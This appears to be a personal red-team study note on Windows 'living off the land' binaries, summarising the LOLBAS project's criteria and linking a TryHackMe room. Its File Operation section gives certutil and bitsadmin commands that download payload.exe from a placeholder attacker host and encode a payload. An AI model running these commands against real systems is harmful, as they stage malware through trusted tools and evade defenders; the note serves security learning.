# Windows Living Off The Land

## Sysinternals

Due to the inherent trust Sysinternals has within the Operating system its use does get monitored by Blue Teams. See the [[Sysinternals-Hub]] for connecting links to all the tools eventually.

## LOLBAS
*"The goal of the [LOLBAS](https://lolbas-project.github.io/)  project is to document every binary, script, and library that can be used for Living Off The Land techniques. The phrase "Living off the land" was coined by Christopher Campbell (@obscuresec) & Matt Graeber (@mattifestation) at [DerbyCon 3](https://www.youtube.com/watch?v=j-r6UonEkUw).* The Site [LOLBAS](https://lolbas-project.github.io/) has search functionality for ease of use.

#### Criteria

A LOLBin/Lib/Script must:

-   Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft.
-   Have extra "unexpected" functionality. It is not interesting to document intended use cases.
    -   Exceptions are application whitelisting bypasses
-   Have functionality that would be useful to an APT or red team

Interesting functionality can include:

-   Executing code
    -   Arbitrary code execution
    -   Pass-through execution of other programs (unsigned) or scripts (via a LOLBin)
-   Compiling code
-   File operations
    -   Downloading
    -   Upload
    -   Copy
-   Persistence
    -   Pass-through persistence utilizing existing LOLBin
    -   Persistence (e.g. hide data in ADS, execute at logon)
-   UAC bypass
-   Credential theft
-   Dumping process memory
-   Surveillance (e.g. keylogger, network trace)
-   Log evasion/modification
-   DLL side-loading/hijacking without being relocated elsewhere in the filesystem.

## File Operation

Certutil can download files and encode files. Certutil is a Windows built-in utility for handling certification service.
```shell-session
certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
certutil -encode payload.exe Encoded-payload.txt
```

Bitsadmin [BitsAdmin Documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer) 
```shell-session
bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
```
``


## References
[LOLBAS](https://lolbas-project.github.io/)
[THM Room Living off the land](https://tryhackme.com/room/livingofftheland)
[BitsAdmin Documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer)